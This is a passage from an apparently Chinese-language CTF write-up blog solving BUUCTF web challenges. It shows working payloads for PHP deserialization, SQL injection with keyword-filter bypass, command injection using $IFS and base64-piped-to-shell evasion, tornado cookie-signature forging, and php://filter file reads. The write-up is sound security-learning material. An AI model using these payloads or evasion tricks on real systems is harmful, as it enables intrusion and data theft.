class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span><span class="string">.构造序列化，看源码要构造个啥</span></span><br><span class="line"><span class="string">这里使用php://input居然不行，真是见鬼，</span></span><br><span class="line">    <span class="string">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br><span class="line"><span class="string">payload：?text=data://text/plain,welcome</span> <span class="string">to</span> <span class="string">the</span> <span class="string">zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>看到这题，题目提示备份文件，抓包也没看出啥来，使用dirsearch扫描网站目录<br>可以通过wappalyzer看网站是什么编程语言<br>-e * 各种试一遍太痛苦了，时间也久<br>python dirsearch.py -u url -e php</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>sql注入,学到了双写绕过</p><p>按步骤来，先判断是什么注入</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">.</span>  <span class="number">1</span><span class="string">&#x27;  报错，是字符注入</span></span><br><span class="line"><span class="string">2.  使用万能密码1&#x27;</span> <span class="string">or</span> <span class="string">&#x27;1&#x27;</span><span class="string">=&#x27;1</span>  <span class="string">不行</span></span><br><span class="line"><span class="number">3</span><span class="string">.</span>  <span class="string">判断字段数，使用order</span> <span class="string">by</span> <span class="string">发现or，by被过滤</span></span><br><span class="line"><span class="number">4</span><span class="string">.</span>  <span class="string">使用union</span> <span class="string">select</span> <span class="number">1</span>  <span class="string">发现union，select被过滤</span></span><br><span class="line"><span class="number">5</span><span class="string">.</span>  <span class="string">尝试着双写，ununionion</span>  <span class="string">seselect</span> <span class="string">可行</span></span><br><span class="line"><span class="number">6</span><span class="string">.</span>  <span class="string">ununionion</span> <span class="string">seselect</span> <span class="number">1</span><span class="string">,2,3</span> <span class="string">有三个字段，第二个，第三个字段有回显</span></span><br><span class="line"><span class="number">7</span><span class="string">.</span>  <span class="string">查询所有的数据库，注意or、from要双写，?username=1&#x27;</span> <span class="string">ununionion</span> <span class="string">seselectlect</span> <span class="number">1</span><span class="string">,2,group_concat(schema_name)</span> <span class="string">frfromom</span> <span class="string">infoorrmation_schema.schemata</span> <span class="string">--+</span> <span class="string">&amp;password=admin</span></span><br><span class="line"><span class="number">8</span><span class="string">.</span>  <span class="string">有ctf数据库，flag就在里面</span></span><br><span class="line"><span class="number">9</span><span class="string">.</span>  <span class="string">查表，?username=1&#x27;</span> <span class="string">ununionion</span> <span class="string">seselectlect</span> <span class="number">1</span><span class="string">,2,group_concat(table_name)</span> <span class="string">frfromom</span> <span class="string">infoorrmation_schema.tables</span> <span class="string">where</span> <span class="string">table_schema=&#x27;ctf&#x27;</span> <span class="string">--+</span> <span class="string">&amp;password=admin，报错，where被过滤了双写一下</span></span><br><span class="line"><span class="number">10</span><span class="string">.</span> <span class="string">?username=1&#x27;</span> <span class="string">ununionion</span> <span class="string">seselectlect</span> <span class="number">1</span><span class="string">,2,group_concat(table_name)</span> <span class="string">frfromom</span> <span class="string">infoorrmation_schema.tables</span> <span class="string">whwhereere</span> <span class="string">table_schema=&#x27;ctf&#x27;</span> <span class="string">--+</span> <span class="string">&amp;password=admin，有Flag表</span></span><br><span class="line"><span class="number">11</span><span class="string">.</span> <span class="string">查询表中字段，?username=1&#x27;</span> <span class="string">ununionion</span> <span class="string">seselectlect</span> <span class="number">1</span><span class="string">,2,group_concat(column_name)</span> <span class="string">frfromom</span> <span class="string">infoorrmation_schema.columns</span> <span class="string">whwhereere</span> <span class="string">table_schema=&#x27;ctf&#x27;</span> <span class="string">--+</span> <span class="string">&amp;password=admin，有flag字段</span></span><br><span class="line"><span class="number">12</span><span class="string">.</span> <span class="string">查询字段内容，?username=1&#x27;</span> <span class="string">ununionion</span> <span class="string">seselectlect</span> <span class="number">1</span><span class="string">,2,group_concat(flag)</span> <span class="string">frfromom</span> <span class="string">ctf.Flag</span> <span class="string">--+</span> <span class="string">&amp;password=admin</span></span><br><span class="line"><span class="number">13</span><span class="string">.</span> <span class="string">得到字段内容，flag&#123;e59c4294-2d74-402e-9bc4-0c9f7a8eff2d&#125;</span></span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>又是一道php反序列化<br>源码看不到啥，根据提示找网站备份文件，使用dirsearch工具扫描网站文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dirsearch.py -u url -e php</span><br></pre></td></tr></table></figure><p>搜索<a href="http://www.zip/">www.zip</a></p><p>访问下载下来，看源码分析</p><p>index.php有参数select，把它给反序列化了</p><p>所以要构造序列化 ，看class.php,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得知username=admin,password=100<br>因为usernam，password是私有成员,序列化要加属于哪个类,类名前还要加空字符，值前面也要加空字符<br>构造序列化O:4:”Name”:2{s:12:”%00Name%00username”;s:5:”admin”;s:12:”%00Name%00password”;i:100;}</p><p>payload=  /?select=O:4:”name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>又学到一点，关于tornado的知识，但是不熟悉它</p><p>打开有三个链接，得到一些信息，flag在  /fllllllllllllag<br>render函数，将文件内容显示在网页上<br>签名算法md5(cookie_secret+md5(filename))</p><p>题目用的tornado框架，在不更改签名的情况下访问fllllllllllllag文件<br>出现error?msg=Error</p><p>根据tornado的文档找到cookie_secret在文件handler/settings中，使用render读取此文件内容。</p><p>error?msg=<br>得到cookie_secret</p><p>构造签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span> (<span class="params">s</span>) :</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update( s.encode(<span class="string">&quot;utf8&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> md5.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filehash</span>() :</span></span><br><span class="line">    filename = <span class="string">&#x27;/fllllllllllllag&#x27;</span></span><br><span class="line">    cookie_secret = <span class="string">&#x27;e8580bb9-86fd-48fc-9336-1077e5d3b936&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>( md5(cookie_secret+md5(filename)) )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结果是：&quot;</span>)</span><br><span class="line">    filehash()</span><br></pre></td></tr></table></figure><p>构造payload：file?filename=/fllllllllllllag&amp;filehash=566f08aa39dfdf6f1657d01ffdcf6d38</p><p>得到flag{cad28790-7d34-4f40-b90b-6e3dabc50d1c}</p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>又学到一个知识点，php字符串解析特性</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">PHP的字符串解析特性</span></span><br><span class="line"></span><br><span class="line"><span class="string">这是别人对PHP字符串解析漏洞的理解，</span></span><br><span class="line"><span class="string">我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo]</span> <span class="string">=&gt;</span> <span class="string">“bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。例如，/?%20news[id%00=42会转换为Array([news_id]</span> <span class="string">=&gt;</span> <span class="number">42</span><span class="string">)。如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</span></span><br><span class="line"></span><br><span class="line"><span class="string">/news.php?%20news[id%00=42&quot;+AND+1=0–</span></span><br><span class="line"></span><br><span class="line"><span class="string">上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</span></span><br><span class="line"></span><br><span class="line"><span class="string">PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</span></span><br><span class="line"><span class="number">1</span><span class="string">.删除空白符</span></span><br><span class="line"><span class="number">2</span><span class="string">.将某些字符转换为下划线（包括空格）</span></span><br></pre></td></tr></table></figure><p>我的理解：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">假如waf不允许num变量传递字母：</span></span><br><span class="line"></span><br><span class="line"><span class="string">http://www.xxx.com/index.php?num</span> <span class="string">=</span> <span class="string">aaaa</span>   <span class="string">//显示非法输入的话</span></span><br><span class="line"><span class="string">那么我们可以在num前加个空格：</span></span><br><span class="line"></span><br><span class="line"><span class="string">http://www.xxx.com/index.php?</span> <span class="string">num</span> <span class="string">=</span> <span class="string">aaaa</span></span><br><span class="line"><span class="string">这样waf就找不到num这个变量了，因为现在的变量叫“</span> <span class="string">num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</span></span><br></pre></td></tr></table></figure><p>scandir()</p><p>列出 参数目录 中的文件和目录，要不然我们怎么知道flag在哪。</p><p>首先我们要先扫根目录下的所有文件，也就是是scandir(“/“),但是“/”被过滤了，所以我们用chr(“47”)绕过,发现flagg文件</p><p>然后去读取这个文件</p><p>calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p><h2 id="21-7-21-GXYCTF2019-Ping-Ping-Ping"><a href="#21-7-21-GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="21-7-21 [GXYCTF2019]Ping Ping Ping"></a>21-7-21 [GXYCTF2019]Ping Ping Ping</h2><p>这道题卡了点时间，了解了下linux有不同的shell，大部linux的shell是用bash，但kali新版默认用的是zsh</p><p>这道题是命令执行?ip=127.0.0.1;ls<br>有两个文件falg.php,index.php</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?ip=127.0.0.1;cat</span> <span class="string">flag.php</span></span><br><span class="line"><span class="string">空格被过滤，使用$IFS</span></span><br><span class="line"></span><br><span class="line"><span class="string">?ip=127.0.0.1;cat$&#123;IFS&#125;flag.php</span></span><br><span class="line">&#123;&#125;<span class="string">被过滤</span></span><br><span class="line"></span><br><span class="line"><span class="string">用$IFS$1代替&#123;&#125;</span></span><br><span class="line"><span class="string">?ip=127.0.0.1;cat$IFS$1flag.php</span></span><br><span class="line"><span class="string">flag被过滤，但是$IFS$1没有被过滤</span></span><br><span class="line"></span><br><span class="line"><span class="string">不读flag，读index</span></span><br><span class="line"><span class="string">?ip=127.0.0.1;cat$IFS$1index.php</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">PING <span class="number">127.0</span>.<span class="number">0.1</span> (<span class="number">127.0</span>.<span class="number">0.1</span>): <span class="number">56</span> data bytes</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到过滤的字符</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&amp;</span> <span class="string">/</span> <span class="string">？</span> <span class="string">*</span> <span class="string">&lt;</span> <span class="string">x&#123;00&#125;-\x&#123;20&#125;</span> <span class="string">&gt;</span> <span class="string">&#x27; &quot; \ () [] &#123;&#125;  空格 bash</span></span><br><span class="line"><span class="string">&quot;xxxfxxxlxxxaxxxgxxx&quot; </span></span><br></pre></td></tr></table></figure><p>flag不能按顺序出现</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">使用变量?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span></span><br></pre></td></tr></table></figure><p>最后查看源码</p><p>还有一种方法，内联执行</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?ip=127.0.0.1;cat$IFS`ls`</span></span><br><span class="line"><span class="string">?ip=127.0.0.1;cat$IFS$3`ls`</span></span><br><span class="line"><span class="string">?ip=127.0.0.1;cat$IFS$9`ls`</span></span><br><span class="line"><span class="string">?ip=127.0.0.1|cat$IFS$9`ls`</span></span><br><span class="line"><span class="string">查看源码</span></span><br></pre></td></tr></table></figure><p>被过滤的bash，但sh没有过滤，用管道+sh替换</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">flag.php用base64加密来绕过正则匹配</span></span><br><span class="line"><span class="string">Y2F0IGZsYWcucGhw</span></span><br><span class="line"><span class="string">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash</span></span><br><span class="line"><span class="string">bash被过滤</span></span><br><span class="line"></span><br><span class="line"><span class="string">?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span></span><br><span class="line"><span class="string">查看源码</span></span><br></pre></td></tr></table></figure><p>类似题思路</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">cat</span> <span class="string">fl*</span>  <span class="string">用*匹配任意</span> </span><br><span class="line"><span class="string">cat</span> <span class="string">fla*</span> <span class="string">用*匹配任意</span></span><br><span class="line"><span class="string">ca\t</span> <span class="string">fla\g.php</span>        <span class="string">反斜线绕过</span></span><br><span class="line"><span class="string">cat</span> <span class="string">fl&#x27;&#x27;ag.php</span>        <span class="string">两个单引号绕过</span></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;Y2F0IGZsYWcucGhw&quot;</span> <span class="string">|</span> <span class="string">base64</span> <span class="string">-d</span> <span class="string">|</span> <span class="string">bash</span>      </span><br><span class="line"><span class="string">//base64编码绕过(引号可以去掉)</span>  <span class="string">|(管道符)</span> <span class="string">会把前一个命令的输出作为后一个命令的参数</span></span><br><span class="line"></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> <span class="string">|</span> <span class="string">xxd</span> <span class="string">-r</span> <span class="string">-p</span> <span class="string">|</span> <span class="string">bash</span>       </span><br><span class="line"><span class="string">//hex编码绕过(引号可以去掉)</span></span><br><span class="line"></span><br><span class="line"><span class="string">echo</span> <span class="string">&quot;63617420666c61672e706870&quot;</span> <span class="string">|</span> <span class="string">xxd</span> <span class="string">-r</span> <span class="string">-p</span> <span class="string">|</span> <span class="string">sh</span>     </span><br><span class="line"><span class="string">//sh的效果和bash一样</span></span><br><span class="line"></span><br><span class="line"><span class="string">cat</span> <span class="string">fl[a]g.php</span>       <span class="string">用[]匹配</span></span><br><span class="line"></span><br><span class="line"><span class="string">a=fl;b=ag;cat</span> <span class="string">$a$b</span>          <span class="string">变量替换</span></span><br><span class="line"><span class="string">cp</span> <span class="string">fla&#123;g.php,G&#125;</span>    <span class="string">把flag.php复制为flaG</span></span><br><span class="line"><span class="string">ca$&#123;21&#125;t</span> <span class="string">a.txt</span>     <span class="string">利用空变量</span>  <span class="string">使用$*和$@，$x(x</span> <span class="string">代表</span> <span class="number">1</span><span class="number">-9</span><span class="string">),$&#123;x&#125;(x&gt;=10)(小于</span> <span class="number">10</span> <span class="string">也是可以的)</span> <span class="string">因为在没有传参的情况下，上面的特殊变量都是为空的</span> </span><br></pre></td></tr></table></figure><h2 id="21-7-17-极客大挑战-2019-LoveSQL"><a href="#21-7-17-极客大挑战-2019-LoveSQL" class="headerlink" title="21-7-17 [极客大挑战 2019]LoveSQL"></a>21-7-17 [极客大挑战 2019]LoveSQL</h2><p>先获取参数，然后判断是什么注入，<br>get传参，是一个字符注入，order by 判断有3个字段</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取当前数据库名，是geek</span></span><br><span class="line"><span class="string">?username=1&#x27;</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,database(),version()</span> <span class="string">%23</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库的所有表名</span></span><br><span class="line"><span class="string">?username=1&#x27;</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,group_concat(table_name)</span> <span class="string">from</span> <span class="string">information_schema.tables</span> <span class="string">where</span> <span class="string">table_schema=database()</span> <span class="string">%23</span></span><br><span class="line"><span class="string">得到geekuser,l0ve1ysq1这两个表</span></span><br><span class="line"></span><br><span class="line"><span class="string">然后爆字段</span></span><br><span class="line"><span class="string">?username=1&#x27;</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,group_concat(column_name)</span> <span class="string">from</span> <span class="string">information_schema.columns</span> <span class="string">where</span> <span class="string">table_schema=database()</span> <span class="string">and</span> <span class="string">table_name=&#x27;geekuser&#x27;</span> <span class="string">%23</span></span><br><span class="line"><span class="string">?username=1&#x27;</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,group_concat(column_name)</span> <span class="string">from</span> <span class="string">information_schema.columns</span> <span class="string">where</span> <span class="string">table_schema=database()</span> <span class="string">and</span> <span class="string">table_name=&#x27;l0ve1ysq1&#x27;</span> <span class="string">%23</span></span><br><span class="line"></span><br><span class="line"><span class="string">得到字段为id,username,password</span></span><br><span class="line"></span><br><span class="line"><span class="string">接下来爆数据</span></span><br><span class="line"><span class="string">?username=1&#x27;</span> <span class="string">union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,group_concat(concat_ws(0x7e,id,username,password))</span> <span class="string">from</span>  <span class="string">l0ve1ysq1</span> <span class="string">%23</span> <span class="string">&amp;password=1</span></span><br><span class="line"></span><br><span class="line"><span class="string">得到flag</span></span><br></pre></td></tr></table></figure><h2 id="21-7-16-极客大挑战-2019-Secret-File"><a href="#21-7-16-极客大挑战-2019-Secret-File" class="headerlink" title="21-7-16 [极客大挑战 2019]Secret File"></a>21-7-16 [极客大挑战 2019]Secret File</h2><p>也是一道文件包含，php伪协议<br>先抓包分析，找到secr3t.php<br>filter没有过滤</p><p>构造payload：<a href="http://2b6e23d5-e898-4a8d-9dbf-d1820adebb5a.node4.buuoj.cn/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php">http://2b6e23d5-e898-4a8d-9dbf-d1820adebb5a.node4.buuoj.cn/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</a></p><p>再base64解码</p><h2 id="21-7-16-SUCTF-2019-EasySQL"><a href="#21-7-16-SUCTF-2019-EasySQL" class="headerlink" title="21-7-16 [SUCTF 2019]EasySQL"></a>21-7-16 [SUCTF 2019]EasySQL</h2><p>判断不是字符注入，order by 也没有用，被过滤了，union注入就不行了</p><p>尝试堆叠注入，找到Flag表</p><p>但是show columns from Flag;被过滤了<br>select flag from ctf.Flag;也被过滤了</p><p>看别人博客原理是这样的 select $_GET[‘query’] || flag from flag</p><p>构造payload</p><p>PIPES_AS_CONCAT是把 || 这个符号不做或运算而是当作字符串拼接</p><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p><p>知道源码的情况下的一种解，payload：*,1</p><p>得到flag</p><h2 id="21-7-16-ACTF2020-新生赛-Include"><a 